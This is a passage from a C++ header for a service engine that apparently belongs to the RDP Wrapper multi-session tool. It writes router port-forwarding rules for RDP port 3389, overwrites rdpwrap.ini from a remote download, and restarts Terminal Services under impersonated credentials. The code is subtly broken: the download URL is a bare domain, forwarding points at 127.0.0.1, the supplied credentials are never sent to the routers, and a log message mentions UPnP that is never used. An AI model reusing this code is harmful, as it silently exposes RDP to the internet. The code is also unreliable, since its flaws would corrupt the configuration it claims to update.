            shutdown(lSock, SD_BOTH);
            closesocket(lSock);
            lSock = INVALID_SOCKET;
        }
        WSACleanup();
        Logger::Instance().Log("NetCtrl server stopped.", "Сервер управления NetCtrl успешно остановлен.");
    }

    ~NetworkServer() { Stop(); }
};

// ============================================================================
// 13. АВТОМАТИЧЕСКИЙ МЕНЕДЖЕР ПРОБРОСА ПОРТОВ (Keenetic, Padavan, Tomato API)
// ============================================================================
class RouterManager {
private:
    static std::string SendHttpRequest(const std::string& host, const std::string& path, const std::string& method = "GET", const std::string& data = "", const std::string& authHeader = "") {
        HINTERNET hSession = InternetOpenW(L"RouterAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hSession) return "";

        std::wstring wHost(host.begin(), host.end());
        HINTERNET hConnect = InternetConnectW(hSession, wHost.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) { InternetCloseHandle(hSession); return ""; }

        std::wstring wPath(path.begin(), path.end());
        std::wstring wMethod(method.begin(), method.end());
        HINTERNET hRequest = HttpOpenRequestW(hConnect, wMethod.c_str(), wPath.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        
        if (hRequest) {
            std::string headers = "Content-Type: application/json\r\n";
            if (!authHeader.empty()) headers += authHeader + "\r\n";
            std::wstring wHeaders(headers.begin(), headers.end());

            HttpSendRequestW(hRequest, wHeaders.c_str(), (DWORD)wHeaders.length(), (LPVOID)(data.empty() ? NULL : data.c_str()), (DWORD)data.length());

            std::vector<char> responseBuffer(4096);
            DWORD bytesRead = 0;
            std::string totalResponse = "";
            while (InternetReadFile(hRequest, responseBuffer.data(), (DWORD)responseBuffer.size(), &bytesRead) && bytesRead > 0) {
                totalResponse.append(responseBuffer.data(), bytesRead);
            }
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hSession);
            return totalResponse;
        }
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return "";
    }

public:
    static std::string GetGatewayIp() {
        ULONG len = 0;
        if (GetAdaptersInfo(NULL, &len) == ERROR_BUFFER_OVERFLOW) {
            std::vector<BYTE> buf(len);
            PIP_ADAPTER_INFO pAdapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buf.data());
            if (GetAdaptersInfo(pAdapterInfo, &len) == NO_ERROR) {
                if (pAdapterInfo && strlen(pAdapterInfo->GatewayList.IpAddress.String) > 0) {
                    return pAdapterInfo->GatewayList.IpAddress.String;
                }
            }
        }
        return "192.168.1.1";
    }

    static void ConfigurePortForwarding(const std::wstring& user, const std::wstring& pass, bool isUninstall = false) {
        std::string gw = GetGatewayIp();
        std::string username(user.begin(), user.end());
        std::string password(pass.begin(), pass.end());

        std::string rKeenetic = SendHttpRequest(gw, "/auth");
        if (rKeenetic.find("X-NDM-Challenge") != std::string::npos || rKeenetic.find("realm=\"Keenetic\"") != std::string::npos) {
            Logger::Instance().Log("KeeneticOS detected on gateway.", "На сетевом шлюзе обнаружена прошивка KeeneticOS.");
            if (username.empty() || password.empty()) return;
            std::string cmd = isUninstall ? 
                "{\"no\":{\"ip\":\"static\",\"nat\":\"tcp\",\"port\":3389}}" :
                "{\"ip\":\"static\",\"nat\":\"tcp\",\"port\":3389,\"to\":\"127.0.0.1\"}";
            SendHttpRequest(gw, "/rci/ip/static/nat", "POST", cmd);
            return;
        }

        std::string rPadavan = SendHttpRequest(gw, "/Advanced_VirtualServer_Content.asp");
        if (rPadavan.find("padavan") != std::string::npos || rPadavan.find("wans_vtsnum_x") != std::string::npos) {
            Logger::Instance().Log("Padavan firmware detected on gateway.", "На сетевом шлюзе обнаружена прошивка Padavan.");
            if (username.empty() || password.empty()) return;
            std::string data = isUninstall ? "action_mode=Delete&vts_port_x_0=3389" : "action_mode=Apply&vts_ip_x_0=127.0.0.1&vts_port_x_0=3389&vts_proto_x_0=TCP";
            SendHttpRequest(gw, "/apply.cgi", "POST", data);
            return;
        }

        std::string rTomato = SendHttpRequest(gw, "/forward-port.asp");
        if (rTomato.find("Tomato") != std::string::npos || rTomato.find("portforward") != std::string::npos) {
            Logger::Instance().Log("Tomato firmware detected on gateway.", "На сетевом шлюзе обнаружена прошивка Tomato.");
            if (username.empty() || password.empty()) return;
            std::string data = isUninstall ? "action=commt&port=3389&delete=1" : "action=save&portfw=3389,tcp,127.0.0.1,3389";
            SendHttpRequest(gw, "/tomato.cgi", "POST", data);
            return;
        }

        Logger::Instance().Log("Unknown router firmware. Automatic UPnP mapping skipped.", "Тип прошивки роутера не определен. Настройка UPnP пропущена.");
    }
};

// ============================================================================
// 14. КЛАСС ПЕРИОДИЧЕСКОГО ОБНОВЛЕНИЯ БАЗ ДАННЫХ
// ============================================================================
class NetworkWatchdog {
public:
    static void UpdateIniFromRemote(const std::wstring& customPath = L"") {
        std::wstring targetPath = customPath.empty() ? L"C:\\Program Files\\RDP Wrapper\\rdpwrap.ini" : customPath;
        
        HINTERNET hInternet = InternetOpenW(L"RDPWrapSrvAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return;

        HINTERNET hUrl = InternetOpenUrlW(hInternet, L"https://githubusercontent.com", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hUrl) {
            std::vector<char> buffer(8192);
            DWORD bytesRead = 0;
            // Корректный вызов .c_str() у wstring для совместимости с MinGW GCC fstream
            std::ofstream out(targetPath.c_str(), std::ios::binary | std::ios::trunc);
            
            if (out.is_open()) {
                while (InternetReadFile(hUrl, buffer.data(), (DWORD)buffer.size(), &bytesRead) && bytesRead > 0) {
                    out.write(buffer.data(), bytesRead);
                }
                out.close();
                Logger::Instance().Log("rdpwrap.ini database updated from remote master repository.", "База данных rdpwrap.ini успешно обновлена из главного репозитория.");
            }
            InternetCloseHandle(hUrl);
        } else {
            Logger::Instance().Log("Failed to fetch rdpwrap.ini from network. Using cached/local storage.", "Не удалось загрузить rdpwrap.ini из сети. Используется локальный кэш.");
        }
        InternetCloseHandle(hInternet);
    }
};

// ============================================================================
// 15. УПРАВЛЕНИЕ УДАЛЕННЫМ АДМИНИСТРИРОВАНИЕМ И ПЕРИФЕРИЕЙ
// ============================================================================
class RemoteAdminManager {
private:
    static void RestartTargetService(SC_HANDLE hSCM, const std::wstring& name) {
        SC_HANDLE hSvc = OpenServiceW(hSCM, name.c_str(), SERVICE_STOP | SERVICE_START | SERVICE_QUERY_STATUS);
        if (hSvc) {
            SERVICE_STATUS st;
            ControlService(hSvc, SERVICE_CONTROL_STOP, &st);
            Sleep(1500);
            StartServiceW(hSvc, 0, NULL);
            CloseServiceHandle(hSvc);
        }
    }

public:
    static bool RestartServiceWithPeripherals(const std::wstring& machine, const std::wstring& user, const std::wstring& pass) {
        SecurityManager::EnableTokenPrivileges();

        if (!user.empty() && !pass.empty()) {
            HANDLE hToken = NULL;
            std::wstring dom = L".", u = user;
            size_t s = user.find(L'\\');
            if (s != std::wstring::npos) {
                dom = user.substr(0, s);
                u = user.substr(s + 1);
            }
            if (LogonUserW(u.c_str(), dom.c_str(), pass.c_str(), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken)) {
                ImpersonateLoggedOnUser(hToken);
                CloseHandle(hToken);
            }
        }

        SC_HANDLE hSCM = OpenSCManagerW(machine.empty() ? NULL : machine.c_str(), NULL, SC_MANAGER_ALL_ACCESS);
        if (!hSCM) return false;

        RestartTargetService(hSCM, L"RDPWrapperService");
        RestartTargetService(hSCM, L"UmRdpService"); // Обеспечивает перезапуск редиректора смарт-карт и принтеров
        RestartTargetService(hSCM, L"TermService");

        Logger::Instance().Log("RDP Core Services and Port Redirector successfully restarted.", "Службы RDP и порт-редиректор смарт-карт успешно перезапущены.");
        CloseServiceHandle(hSCM);
        RevertToSelf();
        return true;
    }
};

// ============================================================================
// 16. СЕРВИСНЫЕ ПРОЦЕДУРЫ И ЦИКЛ ВЫПОЛНЕНИЯ СЛУЖБЫ
// ============================================================================

} // namespace RDPWrapperEngine

#endif // SERVICE_ENGINE_HPP
